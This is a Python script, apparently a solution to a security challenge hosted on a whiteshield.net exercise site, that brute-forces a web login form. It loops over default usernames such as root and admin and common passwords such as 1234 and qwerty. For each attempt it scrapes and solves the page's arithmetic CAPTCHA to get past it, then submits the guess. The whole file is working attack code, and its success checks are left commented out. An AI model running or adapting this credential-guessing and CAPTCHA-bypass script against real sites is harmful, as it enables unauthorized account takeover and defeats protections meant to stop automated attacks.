import mechanize
from bs4 import BeautifulSoup
import operator
usernames=["root","john","admin","printer"]
passwords=["password","1234","qwerty","admin"]


for u_element in usernames:
    for p_element in passwords:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        cookies = mechanize.CookieJar()
        br.set_cookiejar(cookies)
        br.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')]
        br.set_handle_refresh(False)
        a=br.open("https://afeladat2017.whiteshield.net/login")
        br.select_form(nr=0)

        res = br.submit()
        html = res.read()
        soup = BeautifulSoup(html,"lxml")
        form = soup.find("form", action="/login")
        nmath= form.find("span", id="math").text
        math=nmath.replace('=', '')
        print(math)

        # succes_div = soup.find("div", class_="container")
        # succes_text = succes_div.find("article").find("h1").text

        # web_operators = math[1]
        # #if the first tag lower than 10>
        # if(web_operators in math[0:2]):
        #     first_math = (math[0]) #1számjegyü
        # else:
        #     first_math = (math[0:2]) #2számjegyü
        # print("first",first_math)
           
        # if(first_math == (math[0])):
        #     second_math = (math[3:-1])
        # else:
        #     second_math == (math[2:-1])
        # print("second:",second_math)
        ops = {
        "+": operator.add,
        "-": operator.sub,
        "*": operator.mul,
        "/": operator.truediv
            }
        # print(ops)
        web_operators =""
        first_math=0
        second_math=0

        if(math[1] not in ["+","-","/","*"]):
            web_operators = math[2]
            first_math = math[0:2]
            #talan meg kell nézni hogy van e több 3.nál
            second_math = math[3:]
        else:
            web_operators=math[1]
            first_math = math[0]
            #talan meg kell nézni hogy van e több 2.nál
            second_math = math[2:]
            # web_operators = math[2]
            # #second math undefined
            # second_math = math[2:] 
            # first_math = math[0:2] 
        # elif(math[1]  in ["+","-","/","*"]):
        #     web_operators = math[1]
        #     first_math = math[0:1] 
        #     second_math = math[1:] 
            
        print(first_math)
        print(web_operators)
        
        print(second_math)
        
        
        operators = ops[web_operators](int(first_math),int(second_math))
        str_operator = str(operators)
        All=[]
        User=[]
        Pass=[]
        f=br.select_form(action='/login')
        User.append(u_element)
        # f=br.select_form(action='/login')
        Pass.append(p_element)
        br.form['username'] = u_element 
        br.form['password'] =  p_element
        br.form['captcha_1'] = str_operator
        # print(br.form["username"])
        # print(br.form["password"])
        # print(br.form["captcha_1"])
        All.append([u_element,p_element,first_math,web_operators,second_math,operators])
        print(All[-1])
        response=br.submit()
        print("Submit:",response.read())
        # if("Sucess" in response.read):
        #     print("Logged in")
        #     print(f"The password was:{Pass}")
        #     break
        # else: 
        #      print("Fail")
        

        # if "Success!".encode() in response.read():
        #     print("Logged in")
        #     print(f"The password was:{Pass}")

        # # #      # #failure->again    
        # else:
        #     print("fail")
        # #     pass



